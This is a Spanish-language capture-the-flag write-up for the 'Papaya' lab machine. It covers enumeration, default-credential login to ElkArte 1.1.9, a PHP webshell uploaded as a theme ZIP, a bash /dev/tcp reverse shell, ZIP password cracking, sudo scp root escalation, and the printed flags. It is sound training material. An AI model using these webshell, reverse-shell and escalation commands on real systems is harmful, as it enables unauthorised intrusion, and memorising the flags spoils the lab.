# 🍍 Writeup — Máquina Papaya
**Plataforma:** The Hackers Labs  
**Dificultad:** Principiante  
**Fecha:** 2026-03-22  
**Estado:** Completada ✅

---

## 🗺️ Resumen

Papaya es una máquina Linux que encadena varias técnicas fundamentales de hacking: enumeración de servicios, acceso FTP anónimo, identificación de software vulnerable con credenciales por defecto, explotación de RCE autenticado mediante subida de WebShell, establecimiento de Reverse Shell, cracking de archivos ZIP protegidos con contraseña y escalada de privilegios abusando del binario `scp` con permisos sudo mal configurados.

**Conceptos cubiertos:** Nmap · Virtual Hosting · FTP Anónimo · ROT13 · Credenciales por defecto · Searchsploit · WebShell · Reverse Shell · zip2john · John the Ripper · GTFOBins · Sudo Privilege Escalation

---

## 🔍 1. Reconocimiento

### Escaneo de puertos (Nmap)

```bash
nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn -oN escaneo_papaya.nmap 192.168.0.20
```

**Desglose del comando:**
- `-p-` → escanea los 65535 puertos existentes
- `-sS` → TCP SYN Scan: envía solo el primer paquete de la conexión, más rápido y sigiloso
- `-sC` → ejecuta scripts básicos de reconocimiento
- `-sV` → detecta versiones de los servicios
- `--min-rate 5000` → mínimo 5000 paquetes por segundo
- `-n` → sin resolución DNS (más rápido)
- `-Pn` → no hace ping previo (evita falsos negativos por firewall)
- `-oN` → guarda los resultados en formato normal en el archivo indicado

**Puertos detectados:**

| Puerto | Estado | Servicio | Versión |
|--------|--------|----------|---------|
| 21/tcp | open | FTP | ProFTPD (Debian) |
| 22/tcp | open | SSH | OpenSSH 9.2p1 |
| 80/tcp | open | HTTP | Apache httpd 2.4.59 |

**Análisis inicial:**
- **Puerto 21 (FTP):** ProFTPD — investigar si permite acceso anónimo.
- **Puerto 22 (SSH):** Versión moderna, difícil de explotar directamente. Posible vector si encontramos credenciales.
- **Puerto 80 (HTTP):** Apache con redirección a `http://papaya.thl/` — requiere configurar Virtual Hosting en `/etc/hosts`.

### Configuración de Virtual Hosting

Nmap detecta que el servidor redirige al dominio `papaya.thl`. Para que nuestra máquina sepa resolver ese dominio a la IP del objetivo, añadimos la entrada al archivo `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

Línea añadida:
```
192.168.0.20    papaya.thl
```

**¿Por qué es necesario?** Apache puede alojar múltiples sitios web en la misma IP (Virtual Hosting). Para saber cuál servir, necesita el nombre de dominio. Sin esta entrada, el navegador no puede resolver `papaya.thl` y no llegamos al sitio correcto.

---

## 🌐 2. Enumeración

### FTP Anónimo

```bash
ftp 192.168.0.20
```

Credenciales usadas:
- **Usuario:** `anonymous`
- **Contraseña:** (Enter, vacía)

```bash
ftp> ls -la
```

**Resultado:**
```
-rw-r--r--   1 ftp      ftp            19 Jul  2  2024 secret.txt
```

Descargamos el archivo:
```bash
ftp> get secret.txt
```

Contenido del archivo:
```
ndhvabunlanqnpbñb
```

El texto está codificado en **ROT13** — un cifrado por sustitución que rota cada letra 13 posiciones en el alfabeto. Como el alfabeto tiene 26 letras, aplicarlo dos veces devuelve el texto original.

```bash
cat secret.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M'
```

**Resultado:**
```
aquinohaynadacoño
```

Pista falsa del creador de la máquina. Sin información útil, pero el proceso nos enseña a reconocer y decodificar ROT13.

### Identificación del software web

Al acceder a `http://papaya.thl` encontramos un foro. En el pie de página se identifica el software:

**Elkarte 1.1.9**

### Búsqueda de exploits (Searchsploit)

```bash
searchsploit elkarte
```

**Resultado:**
```
ElkArte Forum 1.1.9 - Remote Code Execution (RCE) (Authenticated) | php/webapps/52026.txt
```

Leemos el exploit:
```bash
searchsploit -p 52026
cat /path/to/52026.txt
```

**Contenido del exploit:**
1. Acceder al panel de administración con credenciales válidas
2. Subir un archivo `.zip` que contiene una WebShell PHP
3. Acceder a la WebShell a través de la ruta de temas instalados

**Conclusión:** Necesitamos credenciales de administrador para usar este exploit.

---

## 🔓 3. Acceso Inicial

### Credenciales por defecto

Probamos credenciales por defecto en el panel de administración (`http://papaya.thl/index.php?action=admin`):

- **Usuario:** `admin`
- **Contraseña:** `password`

Acceso concedido. ✅

**Lección:** Muchos administradores nunca cambian las credenciales por defecto. Siempre probarlas antes de ataques más complejos.

### Creación de la WebShell

Una WebShell es un archivo PHP que acepta comandos a través de la URL y los ejecuta en el servidor.

```bash
echo '<?php echo system($_GET["cmd"]); ?>' > shell.php
zip shell.zip shell.php
```

**¿Por qué ZIP?** La aplicación solo permite subir paquetes comprimidos como temas. Metemos el PHP dentro del ZIP para evadir esta restricción — el servidor lo descomprime y el PHP queda accesible.

### Subida de la WebShell

En el panel de administración:
1. **Theme Management** → **Install a New Theme**
2. **From a local archive** → seleccionamos `shell.zip`
3. Resultado: `shell was installed successfully`

### Verificación de ejecución de código

```
http://papaya.thl/themes/shell/shell.php?cmd=id
```

**Resultado:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Confirmamos RCE como usuario `www-data`. ✅

### Reverse Shell

Con la WebShell funcional, establecemos una Reverse Shell para tener acceso interactivo.

**¿Por qué Reverse Shell y no conexión directa?** Los firewalls bloquean conexiones entrantes pero permiten las salientes. Una Reverse Shell hace que sea el servidor quien inicie la conexión hacia nosotros — el firewall lo deja pasar porque parece tráfico saliente legítimo.

**En Kali — ponemos netcat a escuchar:**
```bash
nc -lvnp 4444
```

- `-l` → modo escucha (listen)
- `-v` → verbose, muestra información detallada
- `-n` → sin resolución DNS
- `-p 4444` → puerto donde escuchamos

**En el navegador — ejecutamos la Reverse Shell a través de la WebShell:**
```
http://papaya.thl/themes/shell/shell.php?cmd=bash+-c+"bash+-i+>%26+/dev/tcp/TU_IP/4444+0>%261"
```

*Nota: Los caracteres especiales (`&`, `>`) deben codificarse en formato URL para que el navegador los transmita correctamente.*

**Shell obtenida:**
```
www-data@papaya:/var/www/html/elkarte/themes/shell$
```

### Estabilización de la shell

La shell obtenida es básica. La estabilizamos para tener autocompletado y flechas:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter dos veces
export TERM=xterm
```

---

## 🔑 4. Movimiento Lateral — www-data → papaya

### Enumeración de usuarios

```bash
cat /etc/passwd | grep /bin/bash
```

**Resultado:**
```
root:x:0:0:root:/root:/bin/bash
papaya:x:1000:1000:,,,:/home/papaya:/bin/bash
```

Dos usuarios con shell activa: `root` y `papaya`.

### Archivo en /opt

```bash
ls -la /opt
```

**Resultado:**
```
-rwxr-xr-x  1 root root  173 Jul  2  2024 pass.zip
```

Copiamos el archivo a la carpeta web para descargarlo desde Kali:

```bash
cp /opt/pass.zip /var/www/html/elkarte/themes/shell/
```

**Desde Kali:**
```bash
wget http://papaya.thl/themes/shell/pass.zip
```

### Cracking del ZIP protegido

El ZIP tiene contraseña. Usamos `zip2john` para extraer el hash y `John the Ripper` para romperlo con un ataque de diccionario.

**¿Qué es un ataque de diccionario?** En lugar de probar todas las combinaciones posibles (fuerza bruta pura), prueba palabras de una lista predefinida. Es muy efectivo porque los humanos tendemos a usar contraseñas predecibles.

```bash
zip2john pass.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Resultado:**
```
jesica           (pass.zip/pass.txt)
```

Descomprimimos:
```bash
unzip pass.zip
# Contraseña: jesica
cat pass.txt
```

**Contenido:**
```
papayarica
```

### Cambio de usuario

```bash
su papaya
# Contraseña: papayarica
```

```bash
whoami
papaya
```

### Flag de usuario

```bash
cat /home/papaya/user.txt
```

```
c84145316c7a5f4574fe34e5164c3c83
```

---

## 👑 5. Escalada de Privilegios — papaya → root

### Enumeración de permisos sudo

```bash
sudo -l
```

**Resultado:**
```
User papaya may run the following commands on papaya:
    (root) NOPASSWD: /usr/bin/scp
```

El usuario `papaya` puede ejecutar `scp` como root sin contraseña.

**¿Qué es `scp`?** Secure Copy Protocol — herramienta legítima para copiar archivos entre máquinas usando SSH. Aunque es completamente normal, al poder ejecutarlo como root podemos abusarlo para escalar privilegios.

### Explotación mediante scp (GTFOBins)

Consultamos GTFOBins (`gtfobins.github.io`) para la técnica de escalada con `scp` vía sudo:

```bash
echo 'exec /bin/sh 0<&2 1>&2' > /tmp/shell.sh
chmod +x /tmp/shell.sh
sudo scp -S /tmp/shell.sh x x:
```

**¿Cómo funciona?**
1. Creamos un script que lanza una shell
2. Le damos permisos de ejecución (`+x`)
3. Ejecutamos `scp` como root pero con `-S` le indicamos que use nuestro script en lugar del programa SSH legítimo — como `scp` corre como root, nuestra shell también lo hace

**Resultado:**
```
#
```

El símbolo `#` confirma que somos root. ✅

### Flag de root

```bash
cat /root/root.txt
```

```
da4ac5feea7ff4ac9f3e0d842d76e271
```

---

## 📊 6. Resumen del ataque

| Fase | Acción | Herramienta | Resultado |
|------|--------|-------------|-----------|
| Reconocimiento | Escaneo de puertos | Nmap | Puertos 21 (FTP), 22 (SSH), 80 (HTTP) |
| Enumeración | FTP anónimo | ftp | secret.txt con mensaje ROT13 (pista falsa) |
| Enumeración | Identificación software | Navegador | Elkarte 1.1.9 vulnerable |
| Enumeración | Búsqueda de exploits | Searchsploit | RCE autenticado (52026) |
| Acceso inicial | Credenciales por defecto | Manual | admin : password |
| Acceso inicial | WebShell PHP en ZIP | Manual | RCE como www-data |
| Acceso inicial | Reverse Shell | Netcat | Shell interactiva como www-data |
| Movimiento lateral | Archivo ZIP en /opt | zip2john + John | Contraseña: jesica → papayarica |
| Movimiento lateral | Cambio de usuario | su | Shell como papaya |
| Post-explotación | User flag | cat | c84145316c7a5f4574fe34e5164c3c83 |
| Escalada | Sudo + scp (GTFOBins) | scp | Shell como root |
| Post-explotación | Root flag | cat | da4ac5feea7ff4ac9f3e0d842d76e271 |

---

## 🧠 7. Lecciones aprendidas

**Vulnerabilidades explotadas:**
- **FTP Anónimo:** El servidor FTP permitía acceso sin credenciales, exponiendo archivos del sistema.
- **Software desactualizado:** Elkarte 1.1.9 tiene un RCE conocido y documentado en Exploit-DB.
- **Credenciales por defecto:** El panel de administración usaba `admin/password` sin cambiar.
- **Subida de archivos sin restricción suficiente:** El gestor de temas permitía subir ZIPs con código PHP malicioso.
- **Información sensible en /opt:** Archivo ZIP con contraseña débil conteniendo credenciales del sistema.
- **Sudo Misconfiguration:** `scp` con permisos NOPASSWD permite escapar a shell root mediante GTFOBins.

**Patrones para el futuro:**
1. Siempre probar FTP anónimo cuando el puerto 21 está abierto — `ftp IP` con usuario `anonymous`
2. Identificar el software y versión de cualquier aplicación web → buscar en Searchsploit
3. Antes de ataques complejos, probar siempre credenciales por defecto
4. Los archivos en `/opt` suelen contener información interesante en CTFs
5. Cualquier binario en `sudo -l` debe consultarse en GTFOBins inmediatamente
6. Los caracteres especiales en URLs deben codificarse (`&` → `%26`, espacio → `+`)

---

*Writeup realizado como parte del proceso de aprendizaje autodidacta en ciberseguridad.*  
*Perfil GitHub: [github.com/HaRoldCant](https://github.com/HaRoldCant)*
